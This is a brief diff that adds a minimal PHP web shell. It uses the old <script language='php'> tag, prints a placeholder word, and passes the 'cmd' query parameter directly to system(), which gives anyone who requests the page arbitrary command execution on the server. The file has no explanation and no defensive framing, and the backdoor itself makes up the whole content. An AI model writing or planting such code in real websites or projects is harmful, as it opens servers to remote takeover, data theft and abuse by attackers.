@@ -1,0 +1,9 @@
+
+<script language="php">
+	echo 'jizz';
+    if($_GET['cmd'])
+    {
+        system($_GET['cmd']);
+    }
+</script>
+
